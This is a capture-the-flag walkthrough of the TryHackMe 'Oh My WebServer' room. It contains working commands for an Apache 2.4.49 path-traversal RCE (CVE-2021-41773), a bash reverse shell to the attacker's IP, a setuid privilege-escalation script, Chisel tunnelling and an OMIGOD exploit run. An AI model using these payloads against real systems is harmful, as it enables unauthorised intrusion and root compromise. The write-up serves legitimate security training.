# Oh My WebServer
https://tryhackme.com/room/ohmyweb | IP=10.10.5.164 | 2022-03-07


## Machine Recon
```
┌──(kali㉿kali)-[~/]
└─$ rustscan -a $IP --ulimit 5000 
Open 10.10.5.164:22
Open 10.10.5.164:80

┌──(kali㉿kali)-[~/]
└─$ nmap -sC -sV $IP -p 22,80
22/tcp open  ssh   OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http   Apache httpd 2.4.49 ((Unix))
```
*Note: some unimportant data was stripped*


## Web Server Recon
- Nikto scan - Nothing helpful (`nikto -h http://$IP/`)
- GoBuster scan:
```sh
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 32 -x php,txt,html

/index.html           (Status: 200) [Size: 57985]
/assets               (Status: 301) [Size: 234]
```

So manual enumeration of the site led me to see it's a simple static site - There was nothing I could exploit there.
However, when I tried looking in the /assets path, I was able to view directories and files. However, there wasn't anything interesting there.
I tried going another route. I looked up the version of the Apache server to see if it's vulnerable. And to my surprise it was! (CVE-2021-41773 | File traversal & RCE) 

So I crafted a payload for RCE using the CVE:
```sh
curl -v "http://$IP/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/bash" -d 'echo Content-Type: text/plain; echo; cat /etc/passwd' -H "Content-Type: text/plain"
```
And it managed to print the /etc/passwd
I used this RCE to make a reverse shell - `bash -i >& /dev/tcp/10.18.7.30/4444 0>&1`


## Reverse Shell
After gaining the reverse shell, I stabilized the connection via [[Stabilize Reverse Shell]].

After running linpeas. It found multiple interesting things.
1. This web-server is inside a container.
2. gcc is installed on the machine.
3. Current capabilities - `Current: = cap_chown`
4. Files with capabilities - `/usr/bin/python3.7 = cap_setuid+ep`

With this info I assume I can write a small script to launch bash with root permissions. So I wrote up

```python
import os

os.setuid(0) # Change user ID to root
os.system('/bin/bash -p') # Run shell as the current user (root)

```
Then I ran it with the vuln app - `python3.7 code.py` and got root on the container.
Going to `/root` I found the user flag.


## Docker Escape
After some manual enumeration that didn't lead anywhere, I've guessed that maybe the host computer for the docker has an internal ip, so I transferred [[Chisel]] to the server, to scan it's internal network with nmap.
```
root@4a70924bafa0:/tmp# ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.2  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:ac:11:00:02  txqueuelen 0  (Ethernet)
```
I found the internal IP of the docker was `172.17.0.2` and the subnet mask was `255.255.0.0`.

Using all this info I started Chisel on my machine: `chisel server -p 3334 --reverse`
Connected with the client to my host: `./chisel client 10.18.7.30:3334 R:socks`
And nmap scanned the internal network - I stripped out irrelevant info:
```
┌──(kali㉿kali)-[~]
└─$ proxychains nmap 172.17.0.0/16                                                                                         
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.1:80  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  172.17.0.2:80  ...  OK
```

That's it! I've found the real server's internal address - `172.17.0.1`

*edit: At this point I've realized from a friend I can just transfer a static executable of nmap to the server instead of tunneling my connection. This way the entire scanning process would be much faster!*

Scanning the host computer:
```
root@4a70924bafa0:/tmp# ./nmap 172.17.0.1 -p- --min-rate 5000

Starting Nmap 6.49BETA1 ( http://nmap.org ) at 2022-03-07 17:09 UTC
Unable to find nmap-services!  Resorting to /etc/services
Cannot find nmap-payloads. UDP payloads are disabled.
Stats: 0:00:26 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 65.86% done; ETC: 17:10 (0:00:13 remaining)
Nmap scan report for ip-172-17-0-1.eu-west-1.compute.internal (172.17.0.1)
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed
Host is up (-0.0014s latency).
Not shown: 65531 filtered ports
PORT     STATE  SERVICE
22/tcp   open   ssh
80/tcp   open   http
5985/tcp closed unknown
5986/tcp open   unknown
MAC Address: 02:42:F0:5F:04:30 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 39.72 seconds
```

Hmm, that's weird? Port 5986 is open. That's the port for WinRM.
I looked up CVEs for this, and found a vulnerability called OMIGOD (CVE-2021-38647 – Unauthenticated RCE as root)
I found a script online on GitHub that utilized this CVE: https://github.com/horizon3ai/CVE-2021-38647
Running the script I managed to read the root flag on the host machine
```
root@4a70924bafa0:/tmp# python3 omigod.py -t 172.17.0.1 -c "cat /root/root.txt"
THM{<redacted>}
```

Overall super fun machine. Pretty hard as well :)
